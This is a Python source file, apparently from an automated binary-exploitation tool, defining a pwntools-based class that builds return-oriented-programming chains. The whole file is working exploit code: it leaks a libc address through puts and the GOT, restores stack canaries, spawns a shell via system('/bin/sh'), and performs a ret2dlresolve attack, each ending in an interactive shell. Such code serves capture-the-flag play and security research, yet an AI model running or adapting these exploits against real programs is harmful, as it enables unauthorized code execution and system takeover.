from pwn import *


# context.log_level = 'DEBUG'


class RopExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.first_input = b""
        self.globals = vuln_details

    def leak_address_chain(self, rop: ROP):
        bin_elf = self.binary.elf
        # print(bin_elf.got.items())
        self.globals["got_func"] = "__libc_start_main"
        rop.call(bin_elf.plt['puts'], [bin_elf.got[self.globals["got_func"]]])
        rop.call(bin_elf.entry)

    def get_shell_chain(self, rop: ROP):
        exec_func = self.binary.find_exec_function(search_libc=True)
        binsh = self.binary.find_binsh(search_libc=True)
        exit_func = self.binary.find_function("exit", search_libc=True)
        rop.call(exec_func, [binsh])
        rop.call(exit_func)

    def trim_input(self, input):
        ip = b"X" * self.binary.elf.bytes
        offset = input.index(ip)
        exploit_input = input[0:offset]
        return exploit_input

    def apply_exploit_input(self, proc, payload):
        current_output = b""
        canary = self.binary.protection["canary"]
        for i, input in enumerate(self.globals["input"]):
            current_output += proc.clean()
            if self.first_input == b"" and current_output != b"":
                self.first_input = current_output
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                proc.send(input)
            else:
                if canary is True and self.globals["canary"] is not None:
                    input = input.replace(b"\x00YRANAC_", self.globals["canary"])
                trimmed_input = self.trim_input(input)
                exploit_payload = flat(
                    trimmed_input,
                    payload
                )
                if len(payload) <= self.globals["control_after_ret"]:
                    proc.sendline(exploit_payload)
                else:
                    log.error("Not enough space for payload")

        current_output += proc.clean()
        log.info("current output: {}".format(current_output))
        log.info("first input: {}".format(self.first_input))
        return current_output

    def ret2libc_exploit(self, proc=None):
        proc = self.binary.elf.process() if proc is None else proc
        # process = gdb.debug(self.binary.bin_path, '''break main''')

        canary = self.binary.protection["canary"]

        rop = ROP([self.binary.elf])
        self.leak_address_chain(rop)
        output = self.apply_exploit_input(proc, rop.chain())

        leak_bytes = output.replace(self.first_input, b"")[-(context.bytes - 1):]  # take last 7 bytes of output
        leak = unpack(leak_bytes.rstrip().ljust(context.bytes, b'\x00'))
        self.binary.adjust_libc_base(leak, self.globals["got_func"])

        rop_libc = ROP([self.binary.libc])
        self.get_shell_chain(rop_libc)
        self.apply_exploit_input(proc, rop_libc.chain())

        proc.interactive()

    def ret2dlresolve_exploit(self, proc=None):
        proc = self.binary.elf.process() if proc is None else proc
        dlresolve = Ret2dlresolvePayload(self.binary.elf, symbol='system', args=['/bin/sh'])
        rop = ROP([self.binary.elf])
        rop.gets(dlresolve.data_addr)
        rop.ret2dlresolve(dlresolve)
        self.apply_exploit_input(proc, rop.chain())
        proc.sendline(dlresolve.payload)

        proc.interactive()
